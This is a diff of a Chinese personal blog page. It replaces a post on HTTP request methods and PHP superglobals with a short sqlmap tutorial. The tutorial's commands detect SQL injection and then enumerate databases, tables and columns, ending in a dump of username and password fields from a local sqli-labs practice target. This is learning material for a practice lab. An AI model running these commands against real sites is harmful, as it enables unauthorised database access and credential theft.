@@ -20,27 +20,27 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="（攻防世界）get可以直接在url后添加，把添加后的url用burpsuites抓包，发送到repeater模块，把GET转为POST填加实体头Content-Type:Content-Type: application&#x2F;x-www-form-urlencoded，再把post请求内容放在最后，然后发送。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="http请求方式">
-<meta property="og:url" content="http://example.com/2021/10/02/http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/index.html">
+<meta property="og:title" content="sqlmap">
+<meta property="og:url" content="http://example.com/2021/10/31/sqlmap/index.html">
 <meta property="og:site_name" content="whhzt的博客">
-<meta property="og:description" content="（攻防世界）get可以直接在url后添加，把添加后的url用burpsuites抓包，发送到repeater模块，把GET转为POST填加实体头Content-Type:Content-Type: application&#x2F;x-www-form-urlencoded，再把post请求内容放在最后，然后发送。">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-10-01T16:27:29.000Z">
-<meta property="article:modified_time" content="2021-10-13T12:11:00.985Z">
+<meta property="og:image" content="https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg">
+<meta property="article:published_time" content="2021-10-31T15:38:38.000Z">
+<meta property="article:modified_time" content="2021-10-31T15:43:51.583Z">
 <meta property="article:author" content="我的博客">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg">
 
 
-<link rel="canonical" href="http://example.com/2021/10/02/http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/">
+<link rel="canonical" href="http://example.com/2021/10/31/sqlmap/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/10/02/http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/","path":"2021/10/02/http请求方式/","title":"http请求方式"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/10/31/sqlmap/","path":"2021/10/31/sqlmap/","title":"sqlmap"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>http请求方式 | whhzt的博客</title>
+<title>sqlmap | whhzt的博客</title>
   
 
 
@@ -95,7 +95,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           Table of Contents
@@ -108,6 +108,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">1.对url进行检测，判断是否存在SQL注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">2.获取数据库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">3 获取数据库中的表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">4.获取表中的列</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">5.获取列中的数据</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -164,7 +165,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/02/http%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/31/sqlmap/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -177,7 +178,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          http请求方式
+          sqlmap
         </h1>
 
         <div class="post-meta-container">
@@ -187,16 +188,10 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
+      
 
-      <time title="Created: 2021-10-02 00:27:29" itemprop="dateCreated datePublished" datetime="2021-10-02T00:27:29+08:00">2021-10-02</time>
+      <time title="Created: 2021-10-31 23:38:38 / Modified: 23:43:51" itemprop="dateCreated datePublished" datetime="2021-10-31T23:38:38+08:00">2021-10-31</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-13 20:11:00" itemprop="dateModified" datetime="2021-10-13T20:11:00+08:00">2021-10-13</time>
-      </span>
 
   
 </div>
@@ -208,10 +203,25 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>（攻防世界）get可以直接在url后添加，把添加后的url用burpsuites抓包，发送到repeater模块，把GET转为POST<br>填加实体头Content-Type:Content-Type: application/x-www-form-urlencoded，再把post请求内容放在最后，然后发送。</p>
+        <p><img src="https://s3.bmp.ovh/imgs/2021/10/3694ac142e813ffd.jpg" alt="这是一张图片"></p>
 <span id="more"></span>
-<p>—九大全局变量：</p>
-<p>$_POST [用于接收post提交的数据]<br>$_GET [用于获取url地址栏的参数数据]<br>$_FILES [用于文件就收的处理img 最常见]<br>$_COOKIE [用于获取与setCookie()中的name 值]<br>$_SESSION [用于存储session的值或获取session中的值]<br>$_REQUEST [具有get,post的功能，但比较慢]<br>SERVER[是预定义服务器变量的一种，所有SERVER[是预定义服务器变量的一种，所有_SERVER [是预定义服务器变量的一种，所有_SERVER开头的都<br>$GLOBALS [一个包含了全部变量的全局组合数组]<br>$_ENV [ 是一个包含服务器端环境变量的数组。它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它]</p>
+<hr>
+<h1>1.对url进行检测，判断是否存在SQL注入</h1>
+sqlmap.py -u “url” --batch // --batch 永远不要要求用户输入，使用默认行为 url必须叫""引起来 <br>
+sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-1/?id=5" -batch <br>
+<h1>2.获取数据库</h1>
+ sqlmap.py -u url --dbs --batch    获取全部数据库 <br>
+sqlmap.py -u url --current-dbs --batch  获取当前数据库 <br>
+sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 --dbs --batch <br>
+<h1>3 获取数据库中的表</h1>
+sqlmap.py -u url -D DB --tables --batch <br>
+sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security --tables --batch <br>
+<h1>4.获取表中的列</h1>
+sqlmap.py -u url -D DB -T TBL --columns --batch <br>
+ sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security -T users --columns --batch <br>
+<h1>5.获取列中的数据</h1>
+sqlmap.py -u url -D DB -T TBL -C COL --dump --batch  // --dump 获取列中的内容 <br>
+sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-1/?id=5 -D security -T users -C "username,password" --dump --batch 
 
     </div>
 
@@ -242,14 +252,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/09/30/%E5%BC%B1%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" rel="prev" title="弱密码破解">
-                  <i class="fa fa-chevron-left"></i> 弱密码破解
+                <a href="/2021/10/25/sqli-labs%205-6/" rel="prev" title="5-6">
+                  <i class="fa fa-chevron-left"></i> 5-6
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/10/13/sqli-labs-%E5%88%9D%E5%85%A5/" rel="next" title="sqli-labs 初入">
-                  sqli-labs 初入 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
